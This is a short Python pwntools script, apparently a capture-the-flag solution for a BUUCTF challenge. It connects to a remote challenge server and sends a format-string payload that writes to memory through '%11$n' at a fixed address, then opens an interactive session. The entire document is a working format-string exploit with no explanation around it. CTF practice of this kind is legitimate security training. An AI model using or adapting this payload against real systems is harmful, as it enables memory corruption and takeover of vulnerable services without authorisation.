from pwn import *
#sh=process("./timu")
sh=remote("node4.buuoj.cn",29909)
data_addr=p32(0x0804A02C)
payload=data_addr+b'%11$n'
sh.sendline(payload)
sh.interactive()
